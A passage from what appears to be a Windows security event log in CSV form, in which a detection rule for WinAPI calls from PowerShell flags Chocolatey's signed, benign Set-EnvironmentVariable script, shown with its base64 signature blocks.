ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","66cccc69-033d-56e2-a1e1-f190cc0a9ca0"
"2019-03-19 14:21:37.056 +01:00","WinAPI Library Calls Via PowerShell Scripts","med","MSEDGEWIN10","PwSh",4104,76,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # 